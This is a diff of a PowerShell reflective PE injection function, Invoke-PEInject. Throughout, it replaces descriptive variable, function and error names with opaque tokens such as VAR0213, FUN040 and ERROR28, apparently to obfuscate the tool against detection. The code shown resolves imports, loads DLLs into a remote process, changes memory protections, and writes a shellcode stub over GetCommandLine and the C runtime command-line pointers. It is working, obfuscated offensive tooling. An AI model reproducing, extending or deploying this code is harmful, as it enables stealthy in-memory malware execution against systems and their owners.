+                    if ($VAR0212.CONST067 -eq 0 `
+                            -and $VAR0212.CONST154 -eq 0 `
+                            -and $VAR0212.CONST153 -eq 0 `
+                            -and $VAR0212.Name -eq 0 `
+                            -and $VAR0212.CONST071 -eq 0) {
+                        
                         break
                     }
 
-                    $ImportDllHandle = [IntPtr]::Zero
-                    $ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
-                    $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
+                    $VAR0213 = [IntPtr]::Zero
+                    $VAR0162 = (FUN005 ([Int64]$VAR0126.VAR0263) ([Int64]$VAR0212.Name))
+                    $VAR0164 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($VAR0162)
 
-                    if ($RemoteLoading -eq $true) {
-                        $ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
+                    if ($VAR0210 -eq $true) {
+                        $VAR0213 = FUN018 -VAR0161 $VAR0161 -VAR0162 $VAR0162
                     }
                     else {
-                        $ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
+                        $VAR0213 = $VAR0042.FUN035.Invoke($VAR0164)
                     }
 
-                    if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero)) {
-                        throw "Error importing DLL, DLLName: $ImportDllPath"
+                    if (($VAR0213 -eq $null) -or ($VAR0213 -eq [IntPtr]::Zero)) {
+                        throw "ERROR28: $VAR0164"
                     }
 
                     
-                    [IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
-                    [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) 
-                    [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
+                    [IntPtr]$VAR0214 = FUN005 ($VAR0126.VAR0263) ($VAR0212.CONST154)
+                    [IntPtr]$VAR0215 = FUN005 ($VAR0126.VAR0263) ($VAR0212.CONST067) 
+                    [IntPtr]$VAR0216 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0215, [Type][IntPtr])
 
-                    while ($OriginalThunkRefVal -ne [IntPtr]::Zero) {
-                        $LoadByOrdinal = $false
-                        [IntPtr]$ProcedureNamePtr = [IntPtr]::Zero
+                    while ($VAR0216 -ne [IntPtr]::Zero) {
+                        $VAR0185 = $false
+                        [IntPtr]$VAR0217 = [IntPtr]::Zero
                         
                         
                         
-                        [IntPtr]$NewThunkRef = [IntPtr]::Zero
-                        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0) {
-                            [IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff 
-                            $LoadByOrdinal = $true
+                        [IntPtr]$VAR0218 = [IntPtr]::Zero
+                        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$VAR0216 -lt 0) {
+                            [IntPtr]$VAR0217 = [IntPtr]$VAR0216 -band 0xffff 
+                            $VAR0185 = $true
                         }
-                        elseif ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0) {
-                            [IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff 
-                            $LoadByOrdinal = $true
+                        elseif ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$VAR0216 -lt 0) {
+                            [IntPtr]$VAR0217 = [Int64]$VAR0216 -band 0xffff 
+                            $VAR0185 = $true
                         }
                         else {
-                            [IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
-                            $StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
-                            $ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
-                            $ProcedureNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ProcedureName)
+                            [IntPtr]$VAR0219 = FUN005 ($VAR0126.VAR0263) ($VAR0216)
+                            $VAR0219 = FUN005 $VAR0219 ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
+                            $VAR0220 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($VAR0219)
+                            $VAR0217 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($VAR0220)
                         }
 
-                        if ($RemoteLoading -eq $true) {
-                            [IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionNamePtr $ProcedureNamePtr -LoadByOrdinal $LoadByOrdinal
+                        if ($VAR0210 -eq $true) {
+                            [IntPtr]$VAR0218 = FUN019 -VAR0161 $VAR0161 -VAR0183 $VAR0213 -VAR0184 $VAR0217 -VAR0185 $VAR0185
                         }
                         else {
-                            [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressIntPtr.Invoke($ImportDllHandle, $ProcedureNamePtr)
+                            [IntPtr]$VAR0218 = $VAR0042.FUN037.Invoke($VAR0213, $VAR0217)
                         }
 
-                        if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero) {
-                            if ($LoadByOrdinal) {
-                                Throw "New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $ProcedureNamePtr. Dll: $ImportDllPath"
+                        if ($VAR0218 -eq $null -or $VAR0218 -eq [IntPtr]::Zero) {
+                            if ($VAR0185) {
+                                Throw "ERROR30: $VAR0217 $VAR0164"
                             }
                             else {
-                                Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
+                                Throw "ERROR31: $VAR0220 $VAR0164"
                             }
                         }
 
-                        [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
+                        [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0218, $VAR0214, $false)
 
-                        $ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
-                        [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
-                        [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
+                        $VAR0214 = FUN005 ([Int64]$VAR0214) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
+                        [IntPtr]$VAR0215 = FUN005 ([Int64]$VAR0215) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
+                        [IntPtr]$VAR0216 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0215, [Type][IntPtr])
 
                         
                         
-                        if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero)) {
-                            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
-                            $ProcedureNamePtr = [IntPtr]::Zero
+                        if ((-not $VAR0185) -and ($VAR0217 -ne [IntPtr]::Zero)) {
+                            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($VAR0217)
+                            $VAR0217 = [IntPtr]::Zero
                         }
                     }
 
-                    $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
+                    $VAR0211 = FUN005 ($VAR0211) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR010.CONST152))
                 }
             }
         }
 
-        Function Get-VirtualProtectValue {
+        Function FUN023 {
             Param(
                 [Parameter(Position = 0, Mandatory = $true)]
                 [UInt32]
-                $SectionCharacteristics
+                $VAR0221
             )
 
-            $ProtectionFlag = 0x0
-            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0) {
-                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0) {
-                    if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0) {
-                        $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
+            $VAR0222 = 0x0
+            if (($VAR0221 -band $VAR0041.CONST016) -gt 0) {
+                if (($VAR0221 -band $VAR0041.CONST017) -gt 0) {
+                    if (($VAR0221 -band $VAR0041.CONST018) -gt 0) {
+                        $VAR0222 = $VAR0041.CONST008
                     }
                     else {
-                        $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
+                        $VAR0222 = $VAR0041.CONST009
                     }
                 }
                 else {
-                    if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0) {
-                        $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
+                    if (($VAR0221 -band $VAR0041.CONST018) -gt 0) {
+                        $VAR0222 = $VAR0041.CONST010
                     }
                     else {
-                        $ProtectionFlag = $Win32Constants.PAGE_EXECUTE
+                        $VAR0222 = $VAR0041.CONST007
                     }
                 }
             }
             else {
-                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0) {
-                    if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0) {
-                        $ProtectionFlag = $Win32Constants.PAGE_READWRITE
+                if (($VAR0221 -band $VAR0041.CONST017) -gt 0) {
+                    if (($VAR0221 -band $VAR0041.CONST018) -gt 0) {
+                        $VAR0222 = $VAR0041.CONST005
                     }
                     else {
-                        $ProtectionFlag = $Win32Constants.PAGE_READONLY
+                        $VAR0222 = $VAR0041.CONST004
                     }
                 }
                 else {
-                    if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0) {
-                        $ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
+                    if (($VAR0221 -band $VAR0041.CONST018) -gt 0) {
+                        $VAR0222 = $VAR0041.CONST006
                     }
                     else {
-                        $ProtectionFlag = $Win32Constants.PAGE_NOACCESS
+                        $VAR0222 = $VAR0041.CONST003
                     }
                 }
             }
 
-            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0) {
-                $ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
+            if (($VAR0221 -band $VAR0041.CONST019) -gt 0) {
+                $VAR0222 = $VAR0222 -bor $VAR0041.CONST011
             }
 
-            return $ProtectionFlag
+            return $VAR0222
         }
 
-        Function Update-MemoryProtectionFlags {
+        Function FUN024 {
             Param(
                 [Parameter(Position = 0, Mandatory = $true)]
                 [System.Object]
-                $PEInfo,
+                $VAR0126,
         
                 [Parameter(Position = 1, Mandatory = $true)]
                 [System.Object]
-                $Win32Functions,
+                $VAR0042,
         
                 [Parameter(Position = 2, Mandatory = $true)]
                 [System.Object]
-                $Win32Constants,
+                $VAR0041,
         
                 [Parameter(Position = 3, Mandatory = $true)]
                 [System.Object]
-                $Win32Types
+                $VAR010
             )
         
-            for ( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++) {
-                [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
-                $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
-                [IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
+            for ( $i = 0; $i -lt $VAR0126.CONST031.CONST121.CONST072; $i++) {
+                [IntPtr]$VAR0160 = [IntPtr](FUN005 ([Int64]$VAR0126.CONST036) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR010.CONST142)))
+                $VAR0192 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0160, [Type]$VAR010.CONST142)
+                [IntPtr]$VAR0223 = FUN005 ($VAR0126.VAR0263) ($VAR0192.CONST074)
             
-                [UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
-                [UInt32]$SectionSize = $SectionHeader.VirtualSize
+                [UInt32]$VAR0224 = FUN023 $VAR0192.CONST067
+                [UInt32]$VAR0225 = $VAR0192.CONST143
             
-                [UInt32]$OldProtectFlag = 0
-                Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
-                $Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
+                [UInt32]$VAR0226 = 0
+                FUN009 -VAR0125 "FUN024::FUN040" -VAR0126 $VAR0126 -VAR0127 $VAR0223 -Size $VAR0225 | Out-Null
+                $Success = $VAR0042.FUN040.Invoke($VAR0223, $VAR0225, $VAR0224, [Ref]$VAR0226)
                 if ($Success -eq $false) {
-                    Throw "Unable to change memory protection"
+                    Throw "ERROR32"
                 }
             }
         }
 
         
         
-        Function Update-ExeFunctions {
+        Function FUN025 {
             Param(
                 [Parameter(Position = 0, Mandatory = $true)]
                 [System.Object]
-                $PEInfo,
+                $VAR0126,
     
                 [Parameter(Position = 1, Mandatory = $true)]
                 [System.Object]
-                $Win32Functions,
+                $VAR0042,
     
                 [Parameter(Position = 2, Mandatory = $true)]
                 [System.Object]
-                $Win32Constants,
+                $VAR0041,
     
                 [Parameter(Position = 3, Mandatory = $true)]
                 [String]
-                $ExeArguments,
+                $VAR0227,
     
                 [Parameter(Position = 4, Mandatory = $true)]
                 [IntPtr]
-                $ExeDoneBytePtr
+                $VAR0228
             )
         
             
-            $ReturnArray = @()
+            $VAR0229 = @()
     
-            $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
-            [UInt32]$OldProtectFlag = 0
+            $VAR0163 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
+            [UInt32]$VAR0226 = 0
     
-            [IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
-            if ($Kernel32Handle -eq [IntPtr]::Zero) {
-                throw "Kernel32 handle null"
+            [IntPtr]$VAR0168 = $VAR0042.FUN041.Invoke("Kernel32.dll")
+            if ($VAR0168 -eq [IntPtr]::Zero) {
+                throw "ERROR33"
             }
     
-            [IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
-            if ($KernelBaseHandle -eq [IntPtr]::Zero) {
-                throw "KernelBase handle null"
-            }
-    
-            
-            
-            
-            $CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
-            $CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
-    
-            [IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
-            [IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")
-    
-            if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero) {
-                throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)"
+            [IntPtr]$VAR0230 = $VAR0042.FUN041.Invoke("KernelBase.dll")
+            if ($VAR0230 -eq [IntPtr]::Zero) {
+                throw "ERROR34"
             }
     
             
-            [Byte[]]$Shellcode1 = @()
-            if ($PtrSize -eq 8) {
-                $Shellcode1 += 0x48 
+            
+            
+            $VAR0231 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($VAR0227)
+            $VAR0232 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($VAR0227)
+    
+            [IntPtr]$VAR0233 = $VAR0042.FUN036.Invoke($VAR0230, "GetCommandLineA")
+            [IntPtr]$VAR0234 = $VAR0042.FUN036.Invoke($VAR0230, "GetCommandLineW")
+    
+            if ($VAR0233 -eq [IntPtr]::Zero -or $VAR0234 -eq [IntPtr]::Zero) {
+                throw "ERROR36: $(FUN008 $VAR0233). ERROR37: $(FUN008 $VAR0234)"
             }
-            $Shellcode1 += 0xb8
-    
-            [Byte[]]$Shellcode2 = @(0xc3)
-            $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
     
             
-            $GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
-            $GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
-            $Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
-            $Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
-            $ReturnArray += , ($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
-            $ReturnArray += , ($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)
+            [Byte[]]$VAR0235 = @()
+            if ($VAR0163 -eq 8) {
+                $VAR0235 += 0x48 
+            }
+            $VAR0235 += 0xb8
+    
+            [Byte[]]$VAR0236 = @(0xc3)
+            $VAR0237 = $VAR0235.Length + $VAR0163 + $VAR0236.Length
     
             
-            [UInt32]$OldProtectFlag = 0
-            $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
+            $VAR0238 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0237)
+            $VAR0239 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0237)
+            $VAR0042.FUN033.Invoke($VAR0238, $VAR0233, [UInt64]$VAR0237) | Out-Null
+            $VAR0042.FUN033.Invoke($VAR0239, $VAR0234, [UInt64]$VAR0237) | Out-Null
+            $VAR0229 += , ($VAR0233, $VAR0238, $VAR0237)
+            $VAR0229 += , ($VAR0234, $VAR0239, $VAR0237)
+    
+            
+            [UInt32]$VAR0226 = 0
+            $Success = $VAR0042.FUN040.Invoke($VAR0233, [UInt32]$VAR0237, [UInt32]($VAR0041.CONST008), [Ref]$VAR0226)
             if ($Success = $false) {
-                throw "Call to VirtualProtect failed"
+                throw "ERROR39"
             }
     
-            $GetCommandLineAAddrTemp = $GetCommandLineAAddr
-            Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
-            $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
-            [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
-            $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
-            Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
+            $VAR0240 = $VAR0233
+            FUN010 -Bytes $VAR0235 -VAR0129 $VAR0240
+            $VAR0240 = FUN005 $VAR0240 ($VAR0235.Length)
+            [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0232, $VAR0240, $false)
+            $VAR0240 = FUN005 $VAR0240 $VAR0163
+            FUN010 -Bytes $VAR0236 -VAR0129 $VAR0240
     
-            $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
+            $VAR0042.FUN040.Invoke($VAR0233, [UInt32]$VAR0237, [UInt32]$VAR0226, [Ref]$VAR0226) | Out-Null
     
     
             
-            [UInt32]$OldProtectFlag = 0
-            $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
+            [UInt32]$VAR0226 = 0
+            $Success = $VAR0042.FUN040.Invoke($VAR0234, [UInt32]$VAR0237, [UInt32]($VAR0041.CONST008), [Ref]$VAR0226)
             if ($Success = $false) {
-                throw "Call to VirtualProtect failed"
+                throw "ERROR40"
             }
     
-            $GetCommandLineWAddrTemp = $GetCommandLineWAddr
-            Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
-            $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
-            [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
-            $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
-            Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
+            $VAR0234Temp = $VAR0234
+            FUN010 -Bytes $VAR0235 -VAR0129 $VAR0234Temp
+            $VAR0234Temp = FUN005 $VAR0234Temp ($VAR0235.Length)
+            [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0231, $VAR0234Temp, $false)
+            $VAR0234Temp = FUN005 $VAR0234Temp $VAR0163
+            FUN010 -Bytes $VAR0236 -VAR0129 $VAR0234Temp
     
-            $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
+            $VAR0042.FUN040.Invoke($VAR0234, [UInt32]$VAR0237, [UInt32]$VAR0226, [Ref]$VAR0226) | Out-Null
             
     
             
@@ -1790,44 +1774,44 @@ function Invoke-PEInject {
             
             
             
-            $DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
+            $VAR0241 = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
                     , "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll", "msvcr120.dll", "msvcrt.dll")
     
-            foreach ($Dll in $DllList) {
-                [IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
-                if ($DllHandle -ne [IntPtr]::Zero) {
-                    [IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
-                    [IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
-                    if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero) {
-                        "Error, couldn't find _wcmdln or _acmdln"
+            foreach ($VAR0242 in $VAR0241) {
+                [IntPtr]$VAR0243 = $VAR0042.FUN041.Invoke($VAR0242)
+                if ($VAR0243 -ne [IntPtr]::Zero) {
+                    [IntPtr]$VAR0244 = $VAR0042.FUN036.Invoke($VAR0243, "_wcmdln")
+                    [IntPtr]$VAR0245 = $VAR0042.FUN036.Invoke($VAR0243, "_acmdln")
+                    if ($VAR0244 -eq [IntPtr]::Zero -or $VAR0245 -eq [IntPtr]::Zero) {
+                        "ERROR41"
                     }
     
-                    $NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
-                    $NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
+                    $VAR0246 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($VAR0227)
+                    $VAR0247 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($VAR0227)
     
                     
-                    $OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
-                    $OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
-                    $OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
-                    $OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
-                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
-                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
-                    $ReturnArray += , ($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
-                    $ReturnArray += , ($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
+                    $VAR0248 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0245, [Type][IntPtr])
+                    $VAR0249 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0244, [Type][IntPtr])
+                    $VAR0250 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0163)
+                    $VAR0251 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0163)
+                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0248, $VAR0250, $false)
+                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0249, $VAR0251, $false)
+                    $VAR0229 += , ($VAR0245, $VAR0250, $VAR0163)
+                    $VAR0229 += , ($VAR0244, $VAR0251, $VAR0163)
     
-                    $Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
+                    $Success = $VAR0042.FUN040.Invoke($VAR0245, [UInt32]$VAR0163, [UInt32]($VAR0041.CONST008), [Ref]$VAR0226)
                     if ($Success = $false) {
-                        throw "Call to VirtualProtect failed"
+                        throw "ERROR42"
                     }
-                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
-                    $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
+                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0246, $VAR0245, $false)
+                    $VAR0042.FUN040.Invoke($VAR0245, [UInt32]$VAR0163, [UInt32]($VAR0226), [Ref]$VAR0226) | Out-Null
     
-                    $Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
+                    $Success = $VAR0042.FUN040.Invoke($VAR0244, [UInt32]$VAR0163, [UInt32]($VAR0041.CONST008), [Ref]$VAR0226)
                     if ($Success = $false) {
-                        throw "Call to VirtualProtect failed"
+                        throw "ERROR43"
                     }
-                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
-                    $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
+                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0247, $VAR0244, $false)
+                    $VAR0042.FUN040.Invoke($VAR0244, [UInt32]$VAR0163, [UInt32]($VAR0226), [Ref]$VAR0226) | Out-Null
                 }
             }
             
@@ -1835,103 +1819,103 @@ function Invoke-PEInject {
             
             
     
-            $ReturnArray = @()
-            $ExitFunctions = @() 
+            $VAR0229 = @()
+            $VAR0252 = @() 
     
             
-            [IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
-            if ($MscoreeHandle -eq [IntPtr]::Zero) {
-                throw "mscoree handle null"
+            [IntPtr]$VAR0253 = $VAR0042.FUN041.Invoke("mscoree.dll")
+            if ($VAR0253 -eq [IntPtr]::Zero) {
+                throw "ERROR44"
             }
-            [IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
-            if ($CorExitProcessAddr -eq [IntPtr]::Zero) {
-                Throw "CorExitProcess address not found"
+            [IntPtr]$VAR0254 = $VAR0042.FUN036.Invoke($VAR0253, "CorExitProcess")
+            if ($VAR0254 -eq [IntPtr]::Zero) {
+                Throw "ERROR45"
             }
-            $ExitFunctions += $CorExitProcessAddr
+            $VAR0252 += $VAR0254
     
             
-            [IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
-            if ($ExitProcessAddr -eq [IntPtr]::Zero) {
-                Throw "ExitProcess address not found"
+            [IntPtr]$VAR0255 = $VAR0042.FUN036.Invoke($VAR0168, "ExitProcess")
+            if ($VAR0255 -eq [IntPtr]::Zero) {
+                Throw "ERROR46"
             }
-            $ExitFunctions += $ExitProcessAddr
+            $VAR0252 += $VAR0255
     
-            [UInt32]$OldProtectFlag = 0
-            foreach ($ProcExitFunctionAddr in $ExitFunctions) {
-                $ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
+            [UInt32]$VAR0226 = 0
+            foreach ($VAR0256 in $VAR0252) {
